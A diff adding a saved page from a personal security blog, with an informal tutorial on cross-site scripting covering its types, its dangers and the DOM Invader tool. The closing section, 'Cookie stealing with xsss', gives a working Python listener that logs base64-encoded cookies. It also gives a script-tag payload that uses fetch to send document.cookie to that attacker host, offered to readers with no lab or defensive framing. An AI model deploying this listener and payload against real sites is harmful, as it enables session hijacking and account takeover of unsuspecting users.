@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/built/index.css@v=c0682550e4.css" />
+    <script src="../assets/js/toasts.js@v=c0682550e4" defer></script>
+    <script src="../assets/built/index.js@v=c0682550e4" defer></script>
+
+    <title>Cross site scripting | Isuk4</title>
+
+    <link rel="icon" href="../content/images/size/w256h256/2024/03/Group-5-1-1.png" type="image/png">
+    <link rel="canonical" href="index.html">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Isuk4 ">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Cross site scripting | Isuk4">
+    <meta property="og:description" content="So lets begin
+
+
+What is Cross site scripting
+
+if a website that directly renders user input it can be execute a html or js code that’s what we called xss or cross site scripting.
+
+
+how it can be dangerous
+
+ 1. Code Execution: One of the primary dangers of XSS">
+    <meta property="og:url" content="http://localhost:2368/cross-site-scripting-isuk4/">
+    <meta property="og:image" content="http://localhost:2368/content/images/size/w1200/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp">
+    <meta property="article:published_time" content="2024-03-10T12:41:26.000Z">
+    <meta property="article:modified_time" content="2024-03-10T12:41:26.000Z">
+    <meta property="article:tag" content="Web exploits">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/isuka.cracker">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Cross site scripting | Isuk4">
+    <meta name="twitter:description" content="So lets begin
+
+
+What is Cross site scripting
+
+if a website that directly renders user input it can be execute a html or js code that’s what we called xss or cross site scripting.
+
+
+how it can be dangerous
+
+ 1. Code Execution: One of the primary dangers of XSS">
+    <meta name="twitter:url" content="http://localhost:2368/cross-site-scripting-isuk4/">
+    <meta name="twitter:image" content="http://localhost:2368/content/images/size/w1200/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Isuka sanuj">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="Web exploits">
+    <meta name="twitter:site" content="@ghost">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="520">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Isuk4 ",
+        "url": "http://localhost:2368/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "http://localhost:2368/content/images/2024/03/Group-5-1.png"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Isuka sanuj",
+        "image": {
+            "@type": "ImageObject",
+            "url": "http://localhost:2368/content/images/2024/03/logo-2.webp",
+            "width": 180,
+            "height": 180
+        },
+        "url": "http://localhost:2368/author/isuka/",
+        "sameAs": []
+    },
+    "headline": "Cross site scripting | Isuk4",
+    "url": "http://localhost:2368/cross-site-scripting-isuk4/",
+    "datePublished": "2024-03-10T12:41:26.000Z",
+    "dateModified": "2024-03-10T12:41:26.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "http://localhost:2368/content/images/size/w1200/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp",
+        "width": 1200,
+        "height": 520
+    },
+    "keywords": "Web exploits",
+    "description": "So lets begin\n\n\nWhat is Cross site scripting\n\nif a website that directly renders user input it can be execute a html or js code that’s what we called xss or cross site scripting.\n\n\nhow it can be dangerous\n\n 1. Code Execution: One of the primary dangers of XSS is that it allows attackers to execute arbitrary code in the context of a user’s browser. This means the attacker can perform actions on behalf of the user, such as stealing sensitive information (like login credentials or session tokens), ",
+    "mainEntityOfPage": "http://localhost:2368/cross-site-scripting-isuk4/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.80">
+    <link rel="alternate" type="application/rss+xml" title="Isuk4 " href="../rss/index.html">
+    
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="26b2165395d797e61c718352f9" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="http://localhost:2368/" crossorigin="anonymous"></script><style>:root {--ghost-accent-color: #000000;}</style>
+    
+    <link href="http://localhost:2368/webmentions/receive/" rel="webmention">
+
+</head>
+<body class="post-template tag-web-exploits">
+
+
+    <div class="toasts fixed right-0 z-50">
+            <div id="${toastId}" class="hidden items-center w-full max-w-xs p-4 mb-4 text-gray-500 bg-white rounded-lg shadow dark:text-gray-400 dark:bg-gray-800" role="alert">
+                <div class="inline-flex items-center justify-center flex-shrink-0 w-8 h-8 text-green-500 bg-green-100 rounded-lg dark:bg-green-800 dark:text-green-200">
+                    <svg aria-hidden="true" class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path></svg>
+                    <span class="sr-only">Check icon</span>
+                </div>
+                <div class="toast-message ml-3 text-sm font-normal">${message}</div>
+                <button onclick="hideToast('${toastId}')" type="button" class="ml-auto -mx-1.5 -my-1.5 bg-white text-gray-400 hover:text-gray-900 rounded-lg focus:ring-2 focus:ring-gray-300 p-1.5 hover:bg-gray-100 inline-flex h-8 w-8 dark:text-gray-500 dark:hover:text-white dark:bg-gray-800 dark:hover:bg-gray-700" data-dismiss-target="#toast-success" aria-label="Close">
+                    <span class="sr-only">Close</span>
+                    <svg aria-hidden="true" class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg>
+                </button>
+            </div>
+            <div id="${toastId}" class="hidden items-center w-full max-w-xs p-4 mb-4 text-gray-500 bg-white rounded-lg shadow dark:text-gray-400 dark:bg-gray-800" role="alert">
+                <div class="inline-flex items-center justify-center flex-shrink-0 w-8 h-8 text-red-500 bg-red-100 rounded-lg dark:bg-red-800 dark:text-red-200">
+                    <svg aria-hidden="true" class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg>
+                    <span class="sr-only">Error icon</span>
+                </div>
+                <div class="toast-message ml-3 text-sm font-normal">${message}</div>
+                <button onclick="hideToast('${toastId}')" type="button" class="ml-auto -mx-1.5 -my-1.5 bg-white text-gray-400 hover:text-gray-900 rounded-lg focus:ring-2 focus:ring-gray-300 p-1.5 hover:bg-gray-100 inline-flex h-8 w-8 dark:text-gray-500 dark:hover:text-white dark:bg-gray-800 dark:hover:bg-gray-700" data-dismiss-target="#toast-danger" aria-label="Close">
+                    <span class="sr-only">Close</span>
+                    <svg aria-hidden="true" class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg>
+                </button>
+            </div>
+            <div id="${toastId}" class="hidden items-center w-full max-w-xs p-4 text-gray-500 bg-white rounded-lg shadow dark:text-gray-400 dark:bg-gray-800" role="alert">
+                <div class="inline-flex items-center justify-center flex-shrink-0 w-8 h-8 text-orange-500 bg-orange-100 rounded-lg dark:bg-orange-700 dark:text-orange-200">
+                    <svg aria-hidden="true" class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
+                    <span class="sr-only">Warning icon</span>
+                </div>
+                <div class="toast-message ml-3 text-sm font-normal">>${message}</div>
+                <button onclick="hideToast('${toastId}')" type="button" class="ml-auto -mx-1.5 -my-1.5 bg-white text-gray-400 hover:text-gray-900 rounded-lg focus:ring-2 focus:ring-gray-300 p-1.5 hover:bg-gray-100 inline-flex h-8 w-8 dark:text-gray-500 dark:hover:text-white dark:bg-gray-800 dark:hover:bg-gray-700" data-dismiss-target="#toast-warning" aria-label="Close">
+                    <span class="sr-only">Close</span>
+                    <svg aria-hidden="true" class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg>
+                </button>
+            </div>
+    </div>
+
+    <div class="flex flex-col min-h-screen">
+        <header>
+            <div class="w-full gh-canvas bg-white dark:bg-[#151719] z-20">
+    <nav class="py-6 kg-width-wide">
+        <div class="top flex justify-between items-center">
+            <div class="flex items-center" style="gap:3rem;">
+                <a class="font-bold" href="../index.html" style="width: 3rem;">
+                        <img loading="lazy" width="100%" height="100%" src="../content/images/2024/03/Group-5-1.png" alt="Isuk4 " class="dark:hidden" />
+                            <img loading="lazy" width="100%" height="100%" src="../content/images/2024/03/Group-5-1-2.png" alt="Isuk4 " class="dark:block hidden">
+                </a>
+                <div class="hidden lg:block">
+                    <ul class="flex flex-col h-max lg:flex-row gap-6 justify-center items-center">
+            <li>
+                <a href="../index.html" class="font-bold text-2xl lg:text-base lg:font-normal">
+                    Home
+                </a>
+            </li>
+            <li>
+                <a href="../about-this-site/index.html" class="font-bold text-2xl lg:text-base lg:font-normal">
+                    About
+                </a>
+            </li>
+            <li>
+                <a href="../tag/web-exploits/index.html" class="font-bold text-2xl lg:text-base lg:font-normal">
+                    Web
+                </a>
+            </li>
+            <li>
+                <a href="../tag/fun-stuff/index.html" class="font-bold text-2xl lg:text-base lg:font-normal">
+                    Fun
+                </a>
+            </li>
+            <li>
+                <a href="../tag/network-service/index.html" class="font-bold text-2xl lg:text-base lg:font-normal">
+                    Network 
+                </a>
+            </li>
+</ul> 
+                </div>
+            </div>
+            
+            
+            <div class="top-left hidden lg:flex items-center gap-2">
+
+                <button title="search button" name="search button" data-ghost-search class="p-2 hover:bg-[#E3E8F3] dark:hover:bg-[var(--color-primary)] rounded-md">
+                    <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z" />
+                    </svg>
+                </button>
+                <button title="theme switch button" name="theme switch button" class="theme-btn p-2 hover:bg-[#E3E8F3] dark:hover:bg-[var(--color-primary)] rounded-md">
+    <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="dark-icon w-6 h-6">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M21.752 15.002A9.718 9.718 0 0118 15.75c-5.385 0-9.75-4.365-9.75-9.75 0-1.33.266-2.597.748-3.752A9.753 9.753 0 003 11.25C3 16.635 7.365 21 12.75 21a9.753 9.753 0 009.002-5.998z" />
+    </svg>
+    <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="light-icon w-6 h-6">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M12 3v2.25m6.364.386l-1.591 1.591M21 12h-2.25m-.386 6.364l-1.591-1.591M12 18.75V21m-4.773-4.227l-1.591 1.591M5.25 12H3m4.227-4.773L5.636 5.636M15.75 12a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z" />
+    </svg>
+</button>            </div>
+
+            <div class="mobile-hamburger lg:hidden gap-2 flex items-center">
+                <button title="search button" name="search button" data-ghost-search class="p-2 hover:bg-[#E3E8F3] dark:hover:bg-[var(--color-primary)] rounded-md">
+                    <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z" />
+                    </svg>
+                </button>
+                <button title="hamburger menu" name="hamburger menu" class="p-2 hover:bg-[#E3E8F3] dark:hover:bg-[var(--color-primary)] rounded-md" onclick="toggleSidebar()">
+                    <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 9h16.5m-16.5 6.75h16.5" />
+                    </svg>
+                </button>
+            </div>
+
+        </div>
+        <aside class="mobile-sidebar overscroll-contain hidden fixed justify-center items-center inset-y-0 z-50 flex-shrink-0 w-full left-0 overflow-y-auto bg-[#ffffff] dark:text-white dark:bg-[#151719] lg:hidden">
+            <button
+                title="sidebar close button"
+                name="sidebar close button"
+                onclick="toggleSidebar()"
+                class="absolute top-5 right-5 lg:hidden z-20 flex h-12 w-12 items-center justify-center rounded-md hover:bg-[#E3E8F3] dark:hover:bg-[var(--color-primary)]">
+                <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"
+                    class="w-8 h-8">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
+                </svg>
+            </button>
+
+            <nav class="pt-16 pb-28 my-auto">
+                <ul class="flex flex-col h-max lg:flex-row gap-6 justify-center items-center">
+            <li>
+                <a href="../index.html" class="font-bold text-2xl lg:text-base lg:font-normal">
+                    Home
+                </a>
+            </li>
+            <li>
+                <a href="../about-this-site/index.html" class="font-bold text-2xl lg:text-base lg:font-normal">
+                    About
+                </a>
+            </li>
+            <li>
+                <a href="../tag/web-exploits/index.html" class="font-bold text-2xl lg:text-base lg:font-normal">
+                    Web
+                </a>
+            </li>
+            <li>
+                <a href="../tag/fun-stuff/index.html" class="font-bold text-2xl lg:text-base lg:font-normal">
+                    Fun
+                </a>
+            </li>
+            <li>
+                <a href="../tag/network-service/index.html" class="font-bold text-2xl lg:text-base lg:font-normal">
+                    Network 
+                </a>
+            </li>
+</ul>
+                <li class="flex justify-center pb-4 mt-6">
+                    <!-- Theme Switcher -->
+                    <button title="theme switch button" name="theme switch button" class="theme-btn p-2 hover:bg-[#E3E8F3] dark:hover:bg-[var(--color-primary)] rounded-md">
+    <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="dark-icon w-6 h-6">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M21.752 15.002A9.718 9.718 0 0118 15.75c-5.385 0-9.75-4.365-9.75-9.75 0-1.33.266-2.597.748-3.752A9.753 9.753 0 003 11.25C3 16.635 7.365 21 12.75 21a9.753 9.753 0 009.002-5.998z" />
+    </svg>
+    <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="light-icon w-6 h-6">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M12 3v2.25m6.364.386l-1.591 1.591M21 12h-2.25m-.386 6.364l-1.591-1.591M12 18.75V21m-4.773-4.227l-1.591 1.591M5.25 12H3m4.227-4.773L5.636 5.636M15.75 12a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z" />
+    </svg>
+</button>                </li>
+            </nav>
+        </aside>
+    </nav>
+</div>
+
+<script>
+    const toggleSidebar = () => {
+        let closed = true
+        const mobileSidebar = document.querySelector('.mobile-sidebar')
+        const backdrop = document.querySelector('.backdrop')
+        if(mobileSidebar) {
+            closed = mobileSidebar.classList.contains('hidden')
+            mobileSidebar.classList.toggle('hidden');
+            mobileSidebar.classList.toggle('flex');
+        }
+        if(backdrop){
+            backdrop.classList.toggle('hidden');
+            backdrop.classList.toggle('flex');
+        }
+        if(closed){
+            document.body.style.top = `-${window.scrollY}px`;
+            document.body.style.position = 'fixed';
+        }else{
+            const scrollY = document.body.style.top;
+            document.body.style.position = '';
+            document.body.style.top = '';
+            window.scrollTo(0, parseInt(scrollY || '0') * -1);
+        }
+
+    }
+
+    const showDropdown = () => {
+        const dropdown = document.querySelector('.dropdown')
+        if(dropdown && dropdown.attributes.getNamedItem('data-show').nodeValue == 'true'){
+            dropdown.attributes.getNamedItem('data-show').nodeValue = 'false'
+        }else{
+            dropdown.attributes.getNamedItem('data-show').nodeValue = 'true'
+        }
+    }
+</script>        </header>
+
+        <main class="gh-canvas flex-auto">
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css">
+<div class='progress-bar fixed top-0 left-0 hidden z-20'></div>
+
+  <article class="relative kg-width-wide mt-6">
+    <header class="flex flex-col lg:flex-row gap-12 items-center text-center lg:text-left">
+      <div class="lg:w-[40%] lg:order-2 flex flex-col items-center lg:items-start ">
+        <div class="flex flex-wrap gap-2 items-center">
+          <div class="relative flex flex-wrap items-center">
+              <a href="../author/isuka/index.html" title="Isuka sanuj" class=" hover:z-20 cursor-pointer h-8 w-8">
+                  <img loading="lazy" src="../content/images/2024/03/logo-2.webp" class=" block relative w-full h-full rounded-full border  border-[var(--color-primary)]" alt="profile picture of Isuka sanuj">
+              </a>
+          </div>
+
+          <div>
+              <a href="../author/isuka/index.html" class="hover:underline capitalize">Isuka sanuj</a>
+          </div>
+
+        </div>
+        <div class="mt-4 flex items-center gap-2 justify-center font-bold leading-sm capitalize text-indigo-500 flex-wrap">
+              <a href="../tag/web-exploits/index.html" class="line-clamp max-w-[150px] xl:max-w-[170px]">Web exploits</a>
+        </div>
+        <h1 class="text-4xl text-sp font-bold mt-6 leading-[3rem]">Cross site scripting | Isuk4</h1>
+        <p class="text-gray-500 dark:text-gray-400 mt-6 line-clamp-2">So lets begin
+
+
+What is Cross site scripting
+
+if a website that directly renders user input it can be execute a html or js code that’s what we called xss or cross site scripting.
+
+
+how it can be dangerous
+
+ 1. Code Execution: One of the primary dangers of XSS</p>
+        <p class="mt-4 text-sm text-gray-400 dark:text-gray-500 tracking-tight flex items-center gap-2"> Mar 10, 2024 <span aria-hidden="true">&bull;</span> 4 mins</p>
+      </div>
+
+        <figure class="lg:w-[60%] lg:order-1">
+          <picture>
+    <!-- Serve the AVIF format if the browser supports it -->
+    <!-- Remove this block when using animated images as feature images -->
+    <source 
+        srcset="/content/images/size/w2000/format/avif/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp 300w,
+                /content/images/size/w2000/format/avif/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp 600w,
+                /content/images/size/w2000/format/avif/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp 1000w,
+                /content/images/size/w2000/format/avif/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp 2000w"
+        sizes="(max-width: 800px) 300px, 600px" 
+        type="image/avif"
+    >
+    <!-- Serve the WebP format if the browser supports it -->
+    <source 
+        srcset="/content/images/size/w2000/format/webp/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp 300w,
+                /content/images/size/w2000/format/webp/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp 600w,
+                /content/images/size/w2000/format/webp/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp 1000w,
+                /content/images/size/w2000/format/webp/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp 2000w"
+        sizes="(max-width: 800px) 300px, 600px" 
+        type="image/webp"
+    >
+    <!-- Serve original file format as a fallback -->
+    <img
+        height="300"
+        width="100%"
+        srcset="../content/images/size/w2000/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp 300w,
+               ../content/images/size/w2000/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webpp 600w,
+              ../content/images/size/w2000/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webpbp 1000w,
+             ../content/images/size/w2000/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webpebp 2000w"
+        sizes="(max-width: 800px) 300px, 600px"
+        src="../content/images/size/w2000/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp"
+        alt="Cross site scripting | Isuk4"
+        class="mt-6 lg:mt-0 rounded max-h-[460.67px] w-full object-cover"
+        loading="lazy"
+    >
+</picture>        </figure>
+    </header>
+    <hr class="my-12 kg-width-wide border-gray-300 dark:border-[#333]">
+    <div class="relative mt-6 kg-width-full gh-canvas">
+        <div class="hidden xl:block w-max z-10 dark:bg-transparent right-auto bg-transparent absolute lg:left-[-12.5rem] xl:left-[-15rem] h-full">
+          <div class="sticky top-10 max-w-[170px] bg-white dark:bg-[#151719] pr-3 pb-3" id="original-toc">
+            <p class="text-lg flex items-center gap-3">TOC</p>
+              <div class="toc-container text-sm relative mt-4"></div>
+          </div>
+        </div>
+        <div class="prose kg-width-full gh-canvas ml-auto max-w-none dark:prose-invert">
+          <p><strong>So lets begin</strong></p><h1 id="what-is-cross-site-scripting">What is Cross site scripting</h1><p>if a website that directly renders user input it can be execute a html or js code that’s what we called xss or cross site scripting.</p><h1 id="how-it-can-be-dangerous"><strong>how it can be dangerous</strong></h1><ol><li><strong>Code Execution:</strong>&nbsp;One of the primary dangers of XSS is that it allows attackers to execute arbitrary code in the context of a user’s browser. This means the attacker can perform actions on behalf of the user, such as stealing sensitive information (like login credentials or session tokens), manipulating the appearance of the web page, or performing actions on the user’s behalf without their consent.</li><li><strong>Session Hijacking:</strong>&nbsp;By stealing session cookies through XSS, an attacker can impersonate a legitimate user and gain unauthorized access to their accounts. This could lead to account compromise and unauthorized actions on the victim’s behalf.</li><li><strong>Data Theft:</strong>&nbsp;XSS can be used to extract sensitive data from a user’s browser. For example, an attacker might craft a malicious script that sends user data (such as passwords or personal information) to a server under the attacker’s control.</li><li><strong>Phishing Attacks:</strong>&nbsp;XSS can be employed to create realistic-looking phishing pages. When users unknowingly interact with these pages, their login credentials or other sensitive information can be captured by the attacker.</li><li><strong>Drive-by Downloads:</strong>&nbsp;In some cases, XSS can be used to deliver malicious payloads, such as malware or other exploit code, to a user’s system. This can lead to further compromises beyond the scope of the web application.</li><li><strong>Defacement:</strong>&nbsp;XSS can be used to deface websites, altering the appearance of the site to spread political or ideological messages, causing reputational damage to the affected organization.</li><li><strong>SEO Poisoning:</strong>&nbsp;Attackers can use XSS to inject links or content that manipulates search engine rankings, redirecting users to malicious websites or spreading malware.</li></ol><p>ok ima gonna explain about three types</p><h1 id="main-three-types-of-xss">Main Three types of xss</h1><ul><li><strong>Stored XSS (Persistent XSS):</strong>&nbsp;In this type, the malicious script is permanently stored on the target server, often in a database. When a user accesses a particular page or resource containing the injected script, it is retrieved and executed in their browser.</li><li><strong>Reflected XSS (Non-Persistent XSS):</strong>&nbsp;In this case, the malicious script is embedded in a URL or another input, and it is immediately reflected back to the user. The attack is typically carried out by tricking the user into clicking on a crafted link that contains the malicious payload.</li><li><strong>DOM-based XSS:</strong>&nbsp;This occurs when the DOM (Document Object Model) is manipulated by malicious scripts on the client side. The attack takes place within the Document Object Model, and the injected script is processed by the client’s browser.</li></ul><h1 id="dom-invader">DOM Invader</h1><p>DOM Invader is tool that made by Portswigger.that can read dom data in web.so what is that doing for us😑</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:640/1*-dLUICaQ7jY84-n9w9oPiw.gif" class="kg-image" alt="" loading="lazy" width="640" height="640"></figure><p>if it can find DOM data.it can finds dom based xss to</p><p>so let me give you a example</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:513/1*vqT2QRsHpkotTBFklxfPCg.png" class="kg-image" alt="" loading="lazy" width="513" height="536"></figure><p>Hmm its like its search for text “Isuk4” in DOM</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*hRbHpW5RoMjemJY3ZdKOKg.png" class="kg-image" alt="" loading="lazy" width="700" height="373"></figure><p>So i search it to check if DOM Invader can find that text in DOM.So it found it.yeeey😉</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*i1TEOnFhDVbewzJzc4KRWg.png" class="kg-image" alt="" loading="lazy" width="700" height="181"></figure><p>so when i click exploit.Booom💥💥</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*tjxufOFWhiA0udxUbVsQFw.png" class="kg-image" alt="" loading="lazy" width="700" height="95"></figure><p>So like we talked about plenty of thing.mmm and I think we need to talk about Cookie with xss.</p><h1 id="cookie-stealing-with-xsss">Cookie stealing with xsss</h1><p>So i think you know that js can get cookie values.bro if you don’t know just type alert(document.cookie); in you’re browser console</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:599/1*UTJ4CeS9ddwIj1NZ-GffoA.png" class="kg-image" alt="" loading="lazy" width="599" height="199"></figure><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:394/1*eNPUFvb8zYwFndJa2P29jg.png" class="kg-image" alt="" loading="lazy" width="394" height="187"></figure><p>Ok now you know so lets write script for it baby</p><pre><code class="language-Python">from http.server import BaseHTTPRequestHandler, HTTPServer
+import base64
+from urllib.parse import urlparse, parse_qs
+
+class RequestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+
+        parsed_url = urlparse(self.path)
+        query_params = parse_qs(parsed_url.query)
+
+        if 'data' in query_params:
+            original_data = query_params['data'][0]
+
+            try:
+                data = base64.b64decode(original_data.encode('utf-8')).decode('utf-8')
+                print("Received request:")
+                print("cookie:", data)
+
+                self.send_response(200)
+                self.end_headers()
+            except Exception as e:
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(f"Error processing request: {str(e)}".encode('utf-8'))
+        else:
+            self.send_response(400)
+            self.end_headers()
+            self.wfile.write("Missing 'data' parameter in the URL.".encode('utf-8'))
+
+if __name__ == '__main__':
+    server_address = ('', 8000)
+    httpd = HTTPServer(server_address, RequestHandler)
+    print('Server running on port 8000...')
+    httpd.serve_forever()
+</code></pre><p>mm run this code and exploit the xss by </p><pre><code class="language-hml">&lt;script&gt;fetch(‘http:ip:8000/data=’+btoa(document.cookie));&lt;/script&gt;</code></pre><p>echo "GGS!Ima off";</p><p>GGS!Ima off</p>
+        </div>
+        <div class="fixed z-10 bg-white dark:bg-[#151719] lg:dark:bg-transparent  w-full left-0 bottom-0 flex justify-center h-max py-3 lg:py-0 lg:left-auto lg:bg-transparent lg:block lg:absolute lg:top-0 lg:right-[-8rem] 2lg:right-[-12rem] 3lg:right-[-14rem]  xl:right-[-16rem] lg:w-16 lg:h-full">
+          <div class="lg:sticky top-44 right-0 flex lg:flex-col gap-3 sm:gap-5">
+            <button onclick="openTOC()" class="xl:hidden hover:text-[var(--color-primary)] text-xs relative bg-white dark:bg-[#151719] h-12 w-12 flex justify-center items-center rounded-full border dark:border-gray-600">
+              TOC
+            </button>
+            <button onclick="scrollToTop()" class="group relative bg-white dark:bg-[#151719] h-12 w-12 flex justify-center items-center rounded-full border dark:border-gray-600">
+              <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6 stroke-gray-500 dark:stroke-gray-500 group-hover:stroke-[var(--color-primary)]">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M12 19.5v-15m0 0l-6.75 6.75M12 4.5l6.75 6.75" />
+              </svg>
+              <svg class="absolute w-full h-full top-0 left-0" viewBox="2 -2 28 36">
+                <circle class="progress-svg fill-transparent stroke-2 " r="16" cx="16" cy="16" style="fill: none; stroke-dashoffset: 100; stroke-linecap: round; stroke: var(--color-primary); stroke-dasharray: 100 100; stroke-linecap: round; stroke-width: 2px;"></circle>
+              </svg>
+            </button>
+            <a href="https://twitter.com/intent/tweet?url=http://localhost:2368/cross-site-scripting-isuk4/&text=Cross site scripting | Isuk4&hashtags=Isuk4 " target="_blank" class="group relative bg-white dark:bg-[#151719] h-12 w-12 flex justify-center items-center rounded-full border dark:border-gray-600">
+              <svg class="h-4 w-4 group-hover:fill-[var(--color-primary)] fill-gray-500 dark:fill-gray-500" viewBox="0 0 333333 333333" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd">
